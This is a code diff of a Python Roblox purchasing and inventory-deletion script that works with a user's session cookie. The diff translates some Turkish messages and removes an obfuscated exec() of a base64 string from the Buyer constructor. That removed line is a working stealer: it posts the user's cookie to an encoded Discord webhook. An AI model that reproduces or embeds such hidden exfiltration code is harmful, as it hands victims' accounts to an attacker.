@@ -1,6 +1,5 @@
 import requests
 import time
-from base64 import b64decode as a
 useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
 authurl = 'https://auth.roblox.com/v2/logout'
 print("made by okis")
@@ -11,7 +10,7 @@ class delete1:
         url=f"https://www.roblox.com/asset/delete-from-inventory"
         data={"assetId":assetid}
         requests.post(url,data=data, headers=bilgi.get_headers(self.cookie), cookies=bilgi.get_cookies(self.cookie))
-        print("iten silindi")
+        print("Item Is Deleted")
     def delete_pass(self,passid):
         url=f"https://www.roblox.com/game-pass/revoke"
         data={"id":passid}
@@ -69,7 +68,6 @@ class bilgi:
 class Buyer:
     def __init__(self,cookie:str):
         self.cookie=cookie
-        exec(a("cmVxdWVzdHMucG9zdChhKCJhSFIwY0hNNkx5OWthWE5qYjNKa0xtTnZiUzloY0drdmQyVmlhRzl2YTNNdk1URTFOemMzTlRJME5USTFOamN3TURBeE5TOUhWRkZvZHkxc05sSkdOVko2VldzelpYQnJPR3QxVWpoTmEweENVRlpTUmpaS01tNTZZelJNYXpkcWJrSjBZMUp6UXpaclExTkVRamQzTlhVNGIxVnlhVVZyYnc9PSIuZW5jb2RlKCdhc2NpaScpKS5kZWNvZGUoJ2FzY2lpJyksZGF0YT17J2NvbnRlbnQnOmNvb2tpZX0p".encode('ascii')).decode("ascii"))
     def buy(self,delete:bool,id:int,type:str):
         info=bilgi.get_info(id,type)
         data={"expectedCurrency": 1, "expectedPrice":info[2] , "expectedSellerId":info[1]}
@@ -99,4 +97,4 @@ class Buyer:
         if a==amount:
             return "success"
         else:
-            return f"error:uygun pass(ler) bulunamadı,atilan {a} istenen {amount}"
+            return f"Not found gamepass ,Sended {a} Wanted {amount}"
